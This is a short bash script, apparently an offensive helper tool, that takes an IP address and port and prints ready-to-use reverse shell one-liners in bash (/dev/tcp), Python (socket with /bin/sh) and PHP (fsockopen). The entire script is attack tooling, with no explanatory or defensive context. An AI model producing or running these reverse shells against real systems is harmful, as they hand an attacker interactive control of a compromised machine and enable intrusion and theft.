#!/bin/bash
revshell() {
    echo -e "\n[+] Bash: bash -i >& /dev/tcp/$1/$2 0>&1\n"
    echo -e "[+] Python: python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect((\"$1\",$2)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call([\"/bin/sh\"])'\n"
    echo -e "[+] PHP: php -r '\$sock=fsockopen(\"$1\",$2);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n"
}

revshell "$1" "$2"
